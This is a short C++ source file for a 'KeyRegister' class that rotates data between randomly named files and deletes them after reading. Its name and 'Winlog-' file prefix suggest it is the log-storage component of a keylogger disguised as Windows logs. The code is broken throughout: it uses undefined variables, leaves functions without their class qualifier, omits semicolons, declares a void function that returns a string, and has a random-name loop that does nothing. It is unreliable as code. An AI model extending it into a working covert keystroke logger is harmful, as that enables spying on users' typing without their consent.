#include "keyRegister/keyRegister.hpp"
#include <stdlib.h>
#include <time.h>

KeyRegister::KeyRegister(size_t fileMaxSize)
	: _currrentFileSize(0), _fileMaxSize(fileMaxSize)
{
	_writeMode = true;
	srand (time(NULL));
	openWriteableFile();
}

char *KeyRegister::read()
{
	char *messages;
	int size;

	if (!_currrentFile.is_open())
		return (NULL);
	_currrentFile.seekg (0, is.end);
	size = is.tellg();
	_currrentFile.seekg (0, is.beg);
	messages = new char[size];
	_currrentFile.read(messages, size);
	if (!_currrentFile)
	{
		delete[] messages;
		messages = NULL;
	}
	_currrentFile.close();
	std::remove(file.front());
	file.pop_front();
	return (messages);
}

void KeyRegister::swapMode()
{
	if (_writeMode)
	{
		_writeMode = false;
		_currrentFile.close();
		openReadableFile();
	}
	else
	{
		_writeMode = true;
		_currrentFile.close();
		openWriteableFile();
	}
}

void openReadableFile()
{
	if (!_file.empty())
	{
		_currrentFile.open(_file.front(), std::ifstream::in | std::ifstream::binary)
	}
}

void openWriteableFile()
{
	std::string file("Winlog-" + getRandomAscii());
	_currrentFile.open(file, std::ifstream::out | std::ifstream::binary);
	_file.push_back(file);
}

void getRandomAscii()
{
	std::string randomAscii;
	for (int i = 0; i < 10; ++i)
		randomAscii + rand() %90 + 32;
	std::cout << randomAscii << std::endl;
	return (randomAscii)
}